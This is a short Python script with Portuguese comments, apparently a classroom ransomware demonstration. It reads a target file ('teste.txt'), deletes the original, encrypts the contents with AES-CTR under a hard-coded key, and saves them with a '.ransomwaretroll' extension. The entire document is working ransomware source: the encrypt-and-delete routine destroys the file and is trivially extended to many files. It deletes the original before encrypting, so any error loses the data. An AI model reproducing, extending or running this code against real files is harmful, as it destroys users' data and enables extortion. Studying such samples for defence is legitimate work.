import os
import pyaes

def encrypt_file(file_name, key):
    try:
        # 1. Abrir o arquivo original em modo leitura binária
        with open(file_name, "rb") as file:
            file_data = file.read()

        # 2. Remover o arquivo original para simular o "sequestro"
        os.remove(file_name)

        # 3. Configurar a criptografia AES (Advanced Encryption Standard)
        # O modo CTR (Counter) é rápido e seguro para este propósito educacional
        aes = pyaes.AESModeOfOperationCTR(key)

        # 4. Criptografar os dados
        crypto_data = aes.encrypt(file_data)

        # 5. Salvar o arquivo criptografado com extensão personalizada
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"[SUCESSO] Arquivo '{file_name}' criptografado para '{new_file_name}'.")
    
    except FileNotFoundError:
        print(f"[ERRO] O arquivo '{file_name}' não foi encontrado.")
    except Exception as e:
        print(f"[ERRO] Falha na criptografia: {e}")

# Definição da chave (DEVE ter 16, 24 ou 32 bytes)
key = b"testeransomwares" # Chave de 16 bytes
target_file = "teste.txt"

encrypt_file(target_file, key)
